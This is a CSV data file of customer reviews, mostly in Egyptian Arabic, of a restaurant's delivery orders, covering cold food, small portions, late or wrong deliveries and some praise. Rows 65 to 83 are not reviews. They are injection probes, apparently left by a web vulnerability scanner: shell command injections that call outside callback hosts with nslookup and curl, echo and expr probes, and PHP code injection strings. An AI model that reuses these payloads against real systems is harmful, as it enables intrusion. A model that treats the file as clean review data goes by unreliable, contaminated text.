,comment
0,الفطيرة حلوة جدا بس الحجم قليل،مينفعش يكون ده الحجم الكبير وبالسعر ده، الحجم اللي وصلني هو الوسط في اغلب المطاعم، ولو ده بسبب إنك بتقدمها عن طريق الأبلكيشن مثلا فلازم تراجع التسعير بتاعك أو تظبط الحجم. لكن الطعم حلو جدا (سجق كيري، والفطيرة كاستر ولبن
1,بارد
2,حلو اوي السجق جميلة و الشوكلاته احلى و احلى
3,الدليفري سلوكه سيء جدا. لا يقرأ العنوان كاملا. وبعدين يزعق فيا انا علشان هو فهم غلط وكمان أتأخر بسبب عدم قرائته لاسم الشارع.
4,انا بحب ماچيستي افضل فرع بتاع اسكندرية بس البيتزا للاسف الشديد كانت ساقعة جدا للأسف وطعمها اتظلم
5,الفطير بارد وناقص اضافه اللبن
6,Great
7,الفطير كان وحش جدا و كنت طالبه كاستر ذيادة و محصلش
8,حلو جدا
9,فطيرة سجق جميلة ، البغاشة سيئة بطريقة بشعة
10,Good
11,ممتاز
12,الفطيره كلها زيت متتكلش
13,تجربة سيئة جدا
14,البيتزا حرفيا عليها عدد قطع لا يتجاوز 2 صباع سجق متقطع ،، وكميه الخضار شبيه ،، كإني جايبها من فرن بلدي
15,it was not taste as used
16,Late
17,The order came after 2 hours and it was cold.
18,الأوردر كان بارد كأنه مركون عنده فى المطعم و ماصدق يديه لأى عميل وخلاص تجربة سيئة جدا
19,أتأخر ساعة ونص
20,The promocode i have applied hasn’t been gained.
21,Not that delicious and expensive (value to money doesn’t make any sense)
22,حاجة وحشة جدا
23,اخد فلوس اكتر من المطلوبة ،حوالى٤٨ جنية ضرائب
24,العلبه جايه مفتوحه مع المندوب حاجه غلط و تقلق جدا
25,فطيره السجق كانت زفره
26,كمية الفراخ قليلة جدا دى مكرونة بالمشروم مش مكرونة فراخ
27,M
28,فطيره الباشه فى الصوره انها فى علبه و متقطعه زى باقى الفطير بس جت فطيره رول و ده مكنش موضح فى الصوره
29,ليه لازم البيوصل الاكل يتصل يسال على العنوان و انا حاطت العنوان و الوكيشن كامل فى الابلكيشن
30,سىء جدا.. عجين الفطير والمكونات رديئة فطيرة السجق بدون طعم و السجق بيقرش و فطيرة الجبنة الرومى الجبنة اللى فيها مش جبنة رومى دى جبنة مطبوخة عديمة الجودة و فطيرة السكر عبارة عن عجبن بدون اى مادة دهنية حتى السكر عبارة عن باودر ابيض بدون طعم و مش مسكرة.
31,It’s not the usual one we order not taste or packaging
32,عجينة الكريب كانت نية
33,.
34,طلبتها فراخ جت لحمة
35,فطيره شوكولاته كانت تحفه جميله وسخنه ❤❤
36,الفطير عنده دسم جدا لا ينصح الكبار السن
37,الطلب وصل غير المطلوب تم إرجاع الطلب والانتظار اكثر من ساعه اضافيه لتغيير الطلب
38,الاكل جاء مش فالطيق مكبوب
39,دسم جدا و مرهق في الهضم و سبب لي مشكلة معوية والبيتزا فقيرة و اشبه بالخبز
40,الفراخ كانت نية
41,I didn’t receive any orders
42,الاكل سقع
43,الصوص كتير اوي والبيتزا عبارة عن قطع فراخ ومشروم فقط من غير طماطم وفلفل وزيتون طعمها وحش الصراحة
44,speedy and excellent service and delivery
45,J
46,أنا جالى اوردر غلط و مش عارف اتواصل معاكوا
47,الحشو كان قليل جدا في الأطراف
48,الفطيره بشعه وحشششششه جدا
49,كان في مسمار صلب في المكرونه
50,الفراخ كانت سيئة جدا.. تقريبا مش طازة معمولة من بدري اوي او من اليوم اللي قبله والتوصيل اتاخر جدااا
51,"I ordered a Negresco, but it had a lot of vegetables."
52,انت غليت زي أي حاجة في مصر ما غليت، ماتصغرش الحجم والحشو يبقى فاضي بقى .. والله لو شفت الصور تضحك .. أول مرة أشوف فطيرة هابي ميل .. وفطيرة الشيكولاتة ، هو تقريباً ما كنش شايف انه بيدلق الشكولاته عالكرتونة مش الفطيرة
53,بطلوا يحطوا فلفل اخضر وفلفل الوان جايز غلى عليهم
54,عجينة كتير و مش حلو
55,التغليف مش احسن حاجه الفطيره الكاستر كانت بتخر لبن من العلبه وغرقت علبه الفطيره السجق
56,Ingredients quality is quite good according to the prices. Tastes better than what I was expecting. The only note I could say is the portions are a little smaller than expected.
57,a bit cold
58,the order was missing the coleslaw
59,اسوء فطير وتغليف وحش جدا
60,Fast delivery
61,حقيقي وحشة جدا جدا اوحش مرة جيت فيها يعني لسة من يومين جايبة منكم بس من طلبات وكان حلو جدا بس النهاردة السي فود قبيل جدا كأني طالبة مكرونة بالوايت صوص وال الفريدو حامية جدا ومتنفعش لطفل والفراخ فيها حرفيا ٥ قطع بالكثير حقيقي وحشة وخسارة الفلوس فيها
62,المذاق ليس جيد
63,It was so greasy
64,very bad
65,"&(nslookup${IFS}-q${IFS}cname${IFS}hitueiungjoppf054f.bxss.me||curl${IFS}hitueiungjoppf054f.bxss.me)&'\""`0&(nslookup${IFS}-q${IFS}cname${IFS}hitueiungjoppf054f.bxss.me||curl${IFS}hitueiungjoppf054f.bxss.me)&`'"
66,|(nslookup${IFS}-q${IFS}cname${IFS}hitaokektmdksfb571.bxss.me||curl${IFS}hitaokektmdksfb571.bxss.me)
67,;(nslookup -q=cname hitkeivfnmmhm022d2.bxss.me||curl hitkeivfnmmhm022d2.bxss.me)|(nslookup -q=cname hitkeivfnmmhm022d2.bxss.me||curl hitkeivfnmmhm022d2.bxss.me)&(nslookup -q=cname hitkeivfnmmhm022d2.bxss.me||curl hitkeivfnmmhm022d2.bxss.me)
68,`(nslookup -q=cname hitsukppimvgj06819.bxss.me||curl hitsukppimvgj06819.bxss.me)`
69,|(nslookup -q=cname hitnpcdtpvalec0e27.bxss.me||curl hitnpcdtpvalec0e27.bxss.me)
70,"&(nslookup -q=cname hitnoaygeqzxe95053.bxss.me||curl hitnoaygeqzxe95053.bxss.me)&'\""`0&(nslookup -q=cname hitnoaygeqzxe95053.bxss.me||curl hitnoaygeqzxe95053.bxss.me)&`'"
71,"&nslookup -q=cname hitkylkpcfcwbac4d2.bxss.me&'\""`0&nslookup -q=cname hitkylkpcfcwbac4d2.bxss.me&`'"
72,$(nslookup -q=cname hitevjltjkpuja3458.bxss.me||curl hitevjltjkpuja3458.bxss.me)
73,(nslookup -q=cname hitwnswgzzllz0be2b.bxss.me||curl hitwnswgzzllz0be2b.bxss.me))
74,expr 9000894001 - 940724
75,"|echo bbmhay$()\ fbzrab\nz^xyu||a #' |echo bbmhay$()\ fbzrab\nz^xyu||a #|"" |echo bbmhay$()\ fbzrab\nz^xyu||a #"
76,"&echo euyuef$()\ iswloi\nz^xyu||a #' &echo euyuef$()\ iswloi\nz^xyu||a #|"" &echo euyuef$()\ iswloi\nz^xyu||a #"
77,"echo ogknxb$()\ odyhdr\nz^xyu||a #' &echo ogknxb$()\ odyhdr\nz^xyu||a #|"" &echo ogknxb$()\ odyhdr\nz^xyu||a #"
78,'.print(md5(31337)).'
79,${@print(md5(31337))}\
80,${@print(md5(31337))}
81,""";print(md5(31337));$a="""
82,';print(md5(31337));$a='
83,;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
